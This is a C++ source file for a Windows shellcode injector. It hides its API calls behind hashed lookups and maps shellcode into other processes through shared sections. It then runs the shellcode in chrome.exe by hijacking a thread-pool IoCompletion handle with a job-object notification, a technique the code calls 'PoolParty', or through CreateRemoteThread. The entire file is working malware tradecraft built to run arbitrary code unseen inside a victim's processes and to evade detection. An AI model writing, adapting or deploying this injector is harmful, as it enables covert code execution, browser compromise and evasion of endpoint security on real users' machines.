#include "Injection.h"
#include "CRT.h"
#include "HashString.h"
#include "ApiResolve.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#pragma comment(lib, "dbghelp.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef enum _SECTION_INHERIT
{
	ViewShare = 1, // The mapped view of the section will be mapped into any child processes created by the process.
	ViewUnmap = 2  // The mapped view of the section will not be mapped into any child processes created by the process.
} SECTION_INHERIT;

bool GetFileDataW(_In_ const std::wstring wsFilepath, _Out_ LPVOID* lpBuffer, _Out_ DWORD* dwFileSize) {
	HANDLE hFile = CreateFileW(wsFilepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	*dwFileSize = GetFileSize(hFile, NULL);
	if (*dwFileSize == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return false;
	}

	*lpBuffer = VirtualAlloc(NULL, *dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*lpBuffer == nullptr) {
		CloseHandle(hFile);
		return false;
	}

	DWORD dwBytesRead;
	BOOL bResult = ReadFile(hFile, *lpBuffer, *dwFileSize, &dwBytesRead, NULL);
	CloseHandle(hFile);
	if (!bResult || dwBytesRead != *dwFileSize) {
		VirtualFree(*lpBuffer, 0, MEM_RELEASE);
		return false;
	}

	return true;
}

bool MappingShellcode(_In_ HANDLE hTargetProcess, _In_ LPVOID lpShellcode, _In_ DWORD dwShellSize, _Out_ LPVOID* lpRemoteAddr, _In_ ULONG PageProtection) {
	ApiResolve apiResolve;
	constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
	LPVOID lpNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
	if (!lpNtdll) {
		return false;
	}

	typedef NTSTATUS(NTAPI* _NtCreateSection) (
		PHANDLE            SectionHandle,
		ACCESS_MASK        DesiredAccess,
		LPVOID ObjectAttributes,
		PLARGE_INTEGER     MaximumSize,
		ULONG              SectionPageProtection,
		ULONG              AllocationAttributes,
		HANDLE             FileHandle
		);

	constexpr unsigned int hashNtCreateSection = ComplexHashForAnsi("NtCreateSection");
	_NtCreateSection pNtCreateSection = (_NtCreateSection)apiResolve.GetApiAddress(lpNtdll, hashNtCreateSection);
	if (!pNtCreateSection) {
		return false;
	}

	NTSTATUS ntStatus;
	HANDLE hSection = nullptr;
	LARGE_INTEGER size;
	size.QuadPart = dwShellSize;
	ntStatus = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
	if (!NT_SUCCESS(ntStatus) || hSection == nullptr) { return false; }

	constexpr unsigned int hashNtMapViewOfSection = ComplexHashForAnsi("NtMapViewOfSection");
	typedef NTSTATUS
	(NTAPI*
		_NtMapViewOfSection)(
			_In_ HANDLE SectionHandle,
			_In_ HANDLE ProcessHandle,
			_Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID* BaseAddress,
			_In_ ULONG_PTR ZeroBits,
			_In_ SIZE_T CommitSize,
			_Inout_opt_ PLARGE_INTEGER SectionOffset,
			_Inout_ PSIZE_T ViewSize,
			_In_ SECTION_INHERIT InheritDisposition,
			_In_ ULONG AllocationType,
			_In_ ULONG PageProtection
			);

	_NtMapViewOfSection pNtMapViewOfSection = (_NtMapViewOfSection)apiResolve.GetApiAddress(lpNtdll, hashNtMapViewOfSection);
	if (!pNtMapViewOfSection) {
		return false;
	}

	PVOID pLocalAddr = nullptr;
	SIZE_T viewSize = dwShellSize;
	ntStatus = pNtMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&pLocalAddr,
		0,
		0,
		nullptr,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) {
		CloseHandle(hSection);
		return false;
	}

	memcpy(pLocalAddr, lpShellcode, dwShellSize);

	viewSize = dwShellSize;
	ntStatus = pNtMapViewOfSection(
		hSection,
		hTargetProcess,
		lpRemoteAddr,
		0,
		0,
		nullptr,
		&viewSize,
		ViewUnmap,
		0,
		PageProtection
	);
	if (!NT_SUCCESS(ntStatus)) {
		CloseHandle(hSection);
		return false;
	}

	return true;
}


HANDLE GetProcHandlebyName(LPWSTR procName) {
	PROCESSENTRY32W entry;
	ApiResolve apiResolve;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
	LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
	if (!lpKernel32) {
		return NULL;
	}

	constexpr unsigned int hashCreateToolhelp32Snapshot = ComplexHashForAnsi("CreateToolhelp32Snapshot");
	typedef HANDLE(WINAPI* _CreateToolhelp32Snapshot)(
		DWORD dwFlags,
		DWORD th32ProcessID
		);
	_CreateToolhelp32Snapshot pCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)apiResolve.GetApiAddress(lpKernel32, hashCreateToolhelp32Snapshot);
	if (!pCreateToolhelp32Snapshot) {
		return NULL;
	}

	HANDLE snapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		return NULL;
	}

	constexpr unsigned int hashProcess32FirstW = ComplexHashForAnsi("Process32FirstW");
	typedef BOOL(WINAPI* _Process32FirstW)(
		HANDLE           hSnapshot,
		LPPROCESSENTRY32W lppe
		);
	_Process32FirstW pProcess32FirstW = (_Process32FirstW)apiResolve.GetApiAddress(lpKernel32, hashProcess32FirstW);
	if (!pProcess32FirstW) {
		return NULL;
	}

	constexpr unsigned int hashProcess32NextW = ComplexHashForAnsi("Process32NextW");
	typedef BOOL(WINAPI* _Process32NextW)(
		HANDLE            hSnapshot,
		LPPROCESSENTRY32W lppe
		);

	_Process32NextW pProcess32NextW = (_Process32NextW)apiResolve.GetApiAddress(lpKernel32, hashProcess32NextW);
	if (!pProcess32NextW) {
		return NULL;
	}

	if (pProcess32FirstW(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				typedef HANDLE(WINAPI* _OpenProcess)(
					DWORD dwDesiredAccess,
					BOOL  bInheritHandle,
					DWORD dwProcessId
					);
				constexpr unsigned int hashOpenProcess = ComplexHashForAnsi("OpenProcess");
				_OpenProcess pOpenProcess = (_OpenProcess)apiResolve.GetApiAddress(lpKernel32, hashOpenProcess);
				if (!pOpenProcess) {
					return NULL;
				}

				hProc = pOpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (pProcess32NextW(snapshot, &entry));
	}

	return NULL;
}


bool RemoteTpJobInsertion(LPVOID lpShellcode, DWORD dwShellSize) {
    ApiResolve apiResolve;
    SIZE_T byteWritten;
    constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
    LPVOID hNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
    LPVOID pDuplicateHandle = new HANDLE;
    DWORD PID = 0;

    std::cout << "[*] Step 1: Getting Chrome handle..." << std::endl;
    HANDLE hProc = GetProcHandlebyName((LPWSTR)L"chrome.exe");
    if (!hProc) {
        std::cout << "[FAIL] GetProcHandlebyName failed" << std::endl;
        return false;
    }
    std::cout << "[OK] Got Chrome handle: " << hProc << std::endl;

    std::cout << "[*] Step 2: Mapping shellcode to remote process..." << std::endl;
    LPVOID lpRemoteAddr = nullptr;
    if (!MappingShellcode(hProc, lpShellcode, dwShellSize, &lpRemoteAddr, PAGE_EXECUTE_READ)) {
        std::cout << "[FAIL] MappingShellcode failed, error: " << GetLastError() << std::endl;
        VirtualFree(lpShellcode, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] Mapping success, Shellcode at: 0x" << std::hex << lpRemoteAddr << std::dec << std::endl;
    std::cout << "[*] Shellcode size: " << dwShellSize << " bytes" << std::endl;

    NTSTATUS ntStatus;
    std::vector<BYTE> information;
    ULONG returnLength = 0;

    std::cout << "[*] Step 3: Getting NtQueryInformationProcess..." << std::endl;
    typedef NTSTATUS(
        NTAPI*
        _NtQueryInformationProcess)(
            IN HANDLE ProcessHandle,
            IN PROCESSINFOCLASS ProcessInformationClass,
            OUT PVOID ProcessInformation,
            IN ULONG ProcessInformationLength,
            OUT PULONG ReturnLength OPTIONAL
            );
    constexpr unsigned int hashNtQueryInformationProcess = ComplexHashForAnsi("NtQueryInformationProcess");
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)apiResolve.GetApiAddress(hNtdll, hashNtQueryInformationProcess);
    if (!pNtQueryInformationProcess) {
        std::cout << "[FAIL] NtQueryInformationProcess not found" << std::endl;
        return false;
    }
    std::cout << "[OK] NtQueryInformationProcess found" << std::endl;

    std::cout << "[*] Step 4: Querying process handle information..." << std::endl;
    do {
        information.resize(returnLength);
        ntStatus =
            pNtQueryInformationProcess(
                hProc,
                static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
                information.data(),
                returnLength,
                &returnLength
            );
        if (ntStatus == 0xC0000004) {
            std::cout << "[DEBUG] Buffer too small, resizing to: " << returnLength << std::endl;
        }
    } while (ntStatus == 0xC0000004);

    if (ntStatus != 0) {
        std::cout << "[FAIL] NtQueryInformationProcess failed with status: 0x" << std::hex << ntStatus << std::dec << std::endl;
        return false;
    }

    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());
    std::cout << "[OK] Got " << pProcessInformation->NumberOfHandles << " handles" << std::endl;

    std::cout << "[*] Step 5: Getting NtQueryObject..." << std::endl;
    typedef NTSTATUS
    (NTAPI* _NtQueryObject)(
        _In_opt_ HANDLE Handle,
        _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
        _Out_writes_bytes_opt_(ObjectInformationLength) PVOID ObjectInformation,
        _In_ ULONG ObjectInformationLength,
        _Out_opt_ PULONG ReturnLength
        );

    constexpr unsigned int hashNtQueryObject = ComplexHashForAnsi("NtQueryObject");
    _NtQueryObject pNtQueryObject = (_NtQueryObject)apiResolve.GetApiAddress(hNtdll, hashNtQueryObject);
    if (!pNtQueryObject) {
        std::cout << "[FAIL] NtQueryObject not found" << std::endl;
        return false;
    }
    std::cout << "[OK] NtQueryObject found" << std::endl;

    std::cout << "[*] Step 6: Searching for IoCompletion handle..." << std::endl;
    HANDLE hDupHandle = NULL;
    for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
        HANDLE tmp = pProcessInformation->Handles[i].HandleValue;

        if (!DuplicateHandle(
            hProc,
            pProcessInformation->Handles[i].HandleValue,
            GetCurrentProcess(),
            &hDupHandle,
            0x140103, // IO_COMPLETION_ALL_ACCESS
            FALSE,
            NULL
        )) {
            continue;
        }

        std::vector<BYTE> object;
        returnLength = 0;

        do {
            object.resize(returnLength);
            ntStatus =
                pNtQueryObject(
                    hDupHandle,
                    static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
                    object.data(),
                    returnLength,
                    &returnLength);
        } while (ntStatus == 0xC0000004);

        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());

        if (pObjectInformation && pObjectInformation->TypeName.Buffer) {
            std::wstring typeName(pObjectInformation->TypeName.Buffer);

            if (typeName == L"IoCompletion") {
                std::cout << "[OK] Found IoCompletion handle at index: " << i << ", handle: " << hDupHandle << std::endl;
                break;
            }
        }
        CloseHandle(hDupHandle);
        hDupHandle = NULL;
    }

    if (!hDupHandle) {
        std::cout << "[FAIL] IoCompletion handle not found in " << pProcessInformation->NumberOfHandles << " handles" << std::endl;
        CloseHandle(hProc);
        return false;
    }

    std::cout << "[*] Step 7: Creating JobObject..." << std::endl;
    HANDLE hJob = CreateJobObjectW(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));
    if (!hJob) {
        std::cout << "[FAIL] CreateJobObjectW failed, error: " << GetLastError() << std::endl;
        CloseHandle(hDupHandle);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] Created JobObject: " << hJob << std::endl;

    std::cout << "[*] Step 8: Allocating TpJob..." << std::endl;
    PFULL_TP_JOB pTpJob = { 0 };
    typedef NTSTATUS(NTAPI* _TpAllocJobNotification)(
        _Out_ PFULL_TP_JOB* JobReturn,
        _In_ HANDLE HJob,
        _In_ PVOID Callback,
        _Inout_opt_ PVOID Context,
        _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron
        );

    constexpr unsigned int hashTpAllocJobNotification = ComplexHashForAnsi("TpAllocJobNotification");
    _TpAllocJobNotification pTpAllocJobNotification = (_TpAllocJobNotification)apiResolve.GetApiAddress(hNtdll, hashTpAllocJobNotification);

    std::cout << "[DEBUG] TpAllocJobNotification address: 0x" << std::hex << (void*)pTpAllocJobNotification << std::dec << std::endl;

    if (!pTpAllocJobNotification) {
        std::cout << "[FAIL] TpAllocJobNotification NOT FOUND in ntdll.dll" << std::endl;
        std::cout << "[INFO] This function may not exist on Windows 10" << std::endl;
        CloseHandle(hJob);
        CloseHandle(hDupHandle);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] TpAllocJobNotification found at: 0x" << std::hex << (void*)pTpAllocJobNotification << std::dec << std::endl;

    std::cout << "[DEBUG] Calling TpAllocJobNotification with:" << std::endl;
    std::cout << "  - Job: " << hJob << std::endl;
    std::cout << "  - Callback: 0x" << std::hex << lpRemoteAddr << std::dec << std::endl;
    std::cout << "  - Context: nullptr" << std::endl;
    std::cout << "  - CallbackEnviron: nullptr" << std::endl;

    const NTSTATUS allocStatus = pTpAllocJobNotification(&pTpJob, hJob, lpRemoteAddr, nullptr, nullptr);
    std::cout << "[DEBUG] TpAllocJobNotification status: 0x" << std::hex << allocStatus << std::dec << std::endl;

    if (!NT_SUCCESS(allocStatus))
    {
        std::cout << "[FAIL] TpAllocJobNotification failed with status: 0x" << std::hex << allocStatus << std::dec << std::endl;
        CloseHandle(hJob);
        CloseHandle(hDupHandle);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] TpJob allocated at: " << pTpJob << std::endl;

    std::cout << "[*] Step 9: Mapping TpJob to remote process..." << std::endl;
    LPVOID RemoteTpJobAddress = nullptr;
    DWORD size = sizeof(FULL_TP_JOB) + 1;
    if (!MappingShellcode(hProc, pTpJob, size, &RemoteTpJobAddress, PAGE_READWRITE)) {
        std::cout << "[FAIL] Mapping TpJob failed, error: " << GetLastError() << std::endl;
        CloseHandle(hJob);
        CloseHandle(hDupHandle);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] TpJob mapped to remote address: 0x" << std::hex << RemoteTpJobAddress << std::dec << std::endl;

    std::cout << "[*] Step 10: Setting Job completion port..." << std::endl;
    JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort{ 0 };
    JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
    JobAssociateCopmletionPort.CompletionPort = hDupHandle;

    BOOL setInfoResult = SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
    if (!setInfoResult) {
        std::cout << "[FAIL] SetInformationJobObject failed, error: " << GetLastError() << std::endl;
        CloseHandle(hJob);
        CloseHandle(hDupHandle);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] SetInformationJobObject success" << std::endl;

    std::cout << "[*] Step 11: Assigning current process to job..." << std::endl;
    BOOL assignResult = AssignProcessToJobObject(hJob, GetCurrentProcess());
    if (!assignResult) {
        std::cout << "[FAIL] AssignProcessToJobObject failed, error: " << GetLastError() << std::endl;
        CloseHandle(hJob);
        CloseHandle(hDupHandle);
        CloseHandle(hProc);
        return false;
    }
    std::cout << "[OK] Process assigned to job" << std::endl;

    std::cout << "[SUCCESS] =======================================" << std::endl;
    std::cout << "[SUCCESS] Injection completed successfully!" << std::endl;
    std::cout << "[SUCCESS] =======================================" << std::endl;

    return true;
}

bool CreateRemoteThreadInject(LPVOID lpShellcode, DWORD dwShellSize, wchar_t* wsProcName) {
    HANDLE hProc = GetProcHandlebyName(wsProcName);
    if (!hProc) {
        return false;
    }

    LPVOID lpRemoteAddr = nullptr;
    if (!MappingShellcode(hProc, lpShellcode, dwShellSize, &lpRemoteAddr, PAGE_EXECUTE_READ)) {
        std::cout << "[FAIL] MappingShellcode failed, error: " << GetLastError() << std::endl;
        VirtualFree(lpShellcode, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    ApiResolve apiResolve;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);

    typedef HANDLE(WINAPI* _CreateRemoteThread)(
        HANDLE                 hProcess,
        LPSECURITY_ATTRIBUTES  lpThreadAttributes,
        SIZE_T                 dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID                 lpParameter,
        DWORD                  dwCreationFlags,
        LPDWORD                lpThreadId
        );

    constexpr unsigned int hashCreateRemoteThread = ComplexHashForAnsi("CreateRemoteThread");
    _CreateRemoteThread pCreateRemoteThread = (_CreateRemoteThread)apiResolve.GetApiAddress(lpKernel32, hashCreateRemoteThread);
    if (!pCreateRemoteThread) {
        return false;
    }

    pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteAddr, NULL, 0, NULL);
}